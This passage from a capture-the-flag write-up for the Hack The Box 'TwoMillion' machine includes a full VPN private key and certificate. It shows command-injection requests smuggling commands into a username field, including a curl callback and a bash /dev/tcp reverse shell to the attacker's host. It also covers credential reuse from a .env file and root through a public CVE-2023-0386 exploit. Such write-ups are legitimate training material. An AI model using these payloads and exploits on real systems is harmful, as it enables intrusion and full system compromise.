        87:bb:04:af:ad:79:d1:bf:c2:f9:fe:50:45:b6:af:e5:b4:f2:
        6f:4f:c3:d2:7e:f2:65:4c:ad:14:bc:93:77:d3:65:cb:6b:7a:
        94:2c:c2:2f:01:4e:35:81:92:a3:ce:03:c9:65:69:ca:fe:74:
        1d:3a:59:eb:2e:1a:41:bc
-----BEGIN CERTIFICATE-----
MIIE4TCCAsmgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjMwNjE2MTYxOTU3WhcNMjQw
NjE1MTYxOTU3WjBTMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xEDAOBgNVBAoMB3dsbjV0MG4xEDAOBgNVBAMMB3dsbjV0MG4w
ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVOGGS1T3fesQV7La1Yd+K
/sa1Tj9BHnw7Sk90BxovdWEFgxP1lFasrr9fRLvnc4kps/K0UfXaN8tdG971rtvu
ND0SLZVXCzOo93IJunjEorIUns+OgPJoz/RIOZb4jZ7zZGR3Jtn2gKeR29Q4KlMz
joMNcYqky2EotaSD23CtZ+DwUh1PttGkVuOimVZtrVmtyvHL0Nli9GofRpZSd+9J
hFRwXGwcKLqhdKIl8No/xOeaxWEbwqEMXDlYFxY5FZrQ1/PHRvoB1qzAIXJmnL2R
mYnEzzag082gvmv1wkpfOOvebKGmUInKax4pZ5oen/kHY8feafnTAZywFU9Bymkn
AgMBAAGjgYkwgYYwHQYDVR0OBBYEFDxB6rCdAXJQ/+rxr00omh3qXdyeMB8GA1Ud
IwQYMBaAFHpi3R22/krI4/if+qz0FQyWui6RMAkGA1UdEwQCMAAwCwYDVR0PBAQD
AgH+MCwGCWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0
ZTANBgkqhkiG9w0BAQsFAAOCAgEAARfA0Ua4M5cgiwWQ7Z3cHHz2ijmop7HbrpNo
CIWI7/ff+tgOs6C84PtHch7ONhK8RoMavis+pVQw8IF8iFjxobvZTPvvC3kGBpYh
ZfOOvTE9nr6yoKJ0BbDZHOm85o5DRAC0t5l6V63ZHs1m4GRr9KH51PVHIH9MNI6E
Zym3dU9J0Kvrx8JKGLfBBABELeINN3Z+5GU9Wd6QMgHSRrBcJA5PruwMpB/sA5b+
+EkuqAqf6E16pnWMY6Pzn5U8NyxpyaiKEnqwvBU2mmNv3qX3heZPC0zcHBqM0QWe
BPTW+rYfsdVtQEJg3CDPkqwDGjnhsV/MLkVwqEIur+p/PZCUFqhafoyJoH6GT5si
4bk3HkuveaDQRT6IEuweGGLY89QIuO+e4nH11Dw3i9NK0molAFojIWgxvcWBkAhK
YLsQP7N5frXr92Q1nNl0spze5Q8yNqCodGGkjysf/VBdU4S/l6N73sCHYtVBpjQx
/WfcOSMDu0be8OQ9gpgLgHurgMmnvf2RBBen7JyECvazsVqghprA24Xu8XDs1ghe
A7IJElzDxwRsZDurGuz5P1Rlp0burCLb2kM0x3MQDcYpR4mtEOPwh7sEr6150b/C
+f5QRbav5bTyb0/D0n7yZUytFLyTd9Nly2t6lCzCLwFONYGSo84DyWVpyv50HTpZ
6y4aQbw=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCVOGGS1T3fesQV
7La1Yd+K/sa1Tj9BHnw7Sk90BxovdWEFgxP1lFasrr9fRLvnc4kps/K0UfXaN8td
G971rtvuND0SLZVXCzOo93IJunjEorIUns+OgPJoz/RIOZb4jZ7zZGR3Jtn2gKeR
29Q4KlMzjoMNcYqky2EotaSD23CtZ+DwUh1PttGkVuOimVZtrVmtyvHL0Nli9Gof
RpZSd+9JhFRwXGwcKLqhdKIl8No/xOeaxWEbwqEMXDlYFxY5FZrQ1/PHRvoB1qzA
IXJmnL2RmYnEzzag082gvmv1wkpfOOvebKGmUInKax4pZ5oen/kHY8feafnTAZyw
FU9BymknAgMBAAECggEADiQXBcCKPzDLKai9HS32mUgmXJgwYQ4ah86K/lvjR2Fq
8wgbpBzipIq1krmuH55QqVBm97UCBM60yaYSgwXcdxPMQHoWukuoIaMRfjUwV1zJ
CNs5StqSyQwBV7bdb8CRXPoZQJFrUR5FbbUqGgh+H1dUuWQWgiIj8E+xFNh+3RqN
/E/cqIMJ5cqHLIJ6T4FYBBHbYEU87jpDXmjDb7+oPnE0kAJMYpVDlzA+Ir3X3QH0
dV0ipSaaC49glRvCPTS5FL1LCpCZPl/uysfjpiAudqTiZJvKlRSJ5auOFyk6kxzc
ECQyGt22jAM6boeNpXW+p0VhEOYJugdW7jiwGDNZAQKBgQC/8jhYltrtSh52QoHe
i3N35K74as/IwQV0GVgtQTUaSM0gPAXZfmpLVkebhWk+FycSWSdNtIwOnAAuGGQQ
9b1y1dXasfrA9zSkYVnsHir8QBQpxvTc1ap/PVJ+VE+segMYB1IivoNWXcErjWEK
G0Mw5Q9+8WlkLof+uL44R1G/kQKBgQDHBB/+afM0jwTH4Lzxs5R5eD32NqkGmNfs
GlDSPP2xk9Yv3hljCkZ6psy829Tim9iUNnM1DcxQZhQYsZ2dBUiCKcpg3aOPlvNE
7u/RxNL0Ji9gQoRRZ2RDvsJHbpVjrfHSbM09iu2Rja0W64ZV4SXfcyxCuz8FGNWw
bE8il9exNwKBgQCWcpyHk3Z1lyrZNrfkXxlaV/xs6guDJwfHQDZFAl9FAtsE8QcE
unlGI5Js69zZtfwB/a840NMWgGADwUptoK+lWsYMbIRGy3yPe16oG91FalRjinZS
wYapxL7sFdl9LwVNyC8w3HLFNyc5o87zxPqdUG0c6svYokAl/1fZdM02gQKBgGmm
V/GwfyqsreYJ+WP6aFyfp40YcVyOMTomsjcZp7foenEI38NDBi1AdTnhHb966lus
GDbW71rTBeIiEED2OArZcpU/s/+bK+OxUGC0syRnTQk15pZsY77O+sX+/5FeGx0R
I1eDdCCr7HJZcAQRNRDNTHbUfl0PVQmGRfBgWWG7AoGBAKmM9dDZFhgrGVJxMtc7
argRElvt9tqep2BmG76JJTL86eh2x/fAILybidn91iSrwysmZQHegEAmhYFRmGiP
zouxFy7NwE9uGAt1SEfEzYqGiYhJZgjaUMT6Sn80mkQ+HUhIpz9RR1+dbqRZ3prT
qHz98fpF/GLR2p5o/xiletVR
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>
```

#### Injection
It is guessed that the way to generate the certificate may directly splice Linux commands, and there is command injection. When trying to use the ls command directly, it fails, but when curl runs OOB, the information is successfully obtained, confirming that there is command injection.

```ruby
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 60

{
	"username":"wln5t0n; curl http://10.10.14.55:80/"
}
```

#### Response on my python server 
```ruby
^^/H/TwoMillion >>> python3 -m http.server 80                                                                                                                 12:26:45 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.221 - - [16/Jun/2023 12:27:16] "GET / HTTP/1.1" 200 -
10.10.11.221 - - [16/Jun/2023 12:27:16] code 404, message File not found
10.10.11.221 - - [16/Jun/2023 12:27:16] "GET /.ovpn HTTP/1.1" 404 -
```

Lets test `whoami` 

#### Request
```ruby
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 41

{
	"username":"wln5t0n; whoami #"
}
```

#### Response
```ruby
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 16 Jun 2023 16:25:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 9

www-data
```

Now lets get the shell by `bash -c  'bash -i >& /dev/tcp/10.10.14.55/1337 0>&1' #`.
#### Request
```ruby
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jli1t3sd64rig7par67u26nfv0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 74

{
	"username":"wln5t0n; bash -c  'bash -i >& /dev/tcp/10.10.14.55/1337 0>&1' #"
}

```

#### Pwncat
```ruby
^^/H/TwoMillion >>> pwncat -l 1337                                                                                                                        (1) 12:34:46 
bash: cannot set terminal process group (1192): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@2million:~/html$
```

We are in `/html` dir i saw `.env` file seems strange we gets password from it .
```ruby
www-data@2million:~/html$ cat .env	
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Now i can do `su` or `ssh` we  
```ruby
www-data@2million:~/html$ ls /home
ls /home
admin
```

I used `su`.
```ruby
www-data@2million:~/html$ su admin 
su admin 
Password: SuperDuperPass123
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

#### User flag
```ruby
admin@2million:~$ ls
ls
user.txt
admin@2million:~$ cat user.txt
cat user.txt
d28a<snip>0bea423
```

### Shell as root

As we got a user name as admin there is a hint for were to look first ting came in my mind is to check mail `/var/mail/admin`.

```ruby
admin@2million:~$ cat /var/mail/admin    
cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

They are talking about patching the OS then i saw kernel version, Box is running Ubuntu 22.04 with the kernel 5.15.70:
```ruby
admin@2million:~$ uname -a
uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ cat /etc/lsb-release
cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

I just googled some poc's online i got this https://github.com/xkaneiki/CVE-2023-0386 by xkaneiki
`README.md` has all information to run this exploit.

```ruby
^^/H/TwoMillion >>> git clone https://github.com/xkaneiki/CVE-2023-0386                                                                                 (255) 12:54:27 
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0
Receiving objects: 100% (24/24), 426.11 KiB | 2.02 MiB/s, done.
Resolving deltas: 100% (7/7), done.
```

we have to upload this whole folder to our target.
```ruby
admin@2million:/tmp$ unzip CVE-2023-0386-main.zip 
Archive:  CVE-2023-0386-main.zip
c4c65cefca1365c807c397e953d048506f3de195
   creating: CVE-2023-0386-main/
  inflating: CVE-2023-0386-main/Makefile  
...[snip]...
  inflating: CVE-2023-0386-main/test/mnt.c
```

**Compile**
```ruby
admin@2million:/tmp$ cd CVE-2023-0386-main/
admin@2million:/tmp/CVE-2023-0386-main$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
...[snip]..
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
gcc -o gc getshell.c
```

```ruby
admin@2million:/tmp/CVE-2023-0386-main$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
```

In the first session, I’ll run the next command from the instructions:
```ruby
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
```

```ruby
admin@2million:/tmp/CVE-2023-0386-main$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun  2 23:11 .
drwxrwxr-x 6 root   root     4096 Jun  2 23:11 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main#
```

WOOT WOOT we are root not just 
```ruby
root@2million:/root# cat root.txt
02336e92<snip>2e24
```

And there is 1 thankyou not as well.
```ruby
 Dear HackTheBox Community,
 
 We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.
 
 From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.
 
To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.
 
Here’s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.
 
With deepest gratitude,

The HackTheBox Team
```

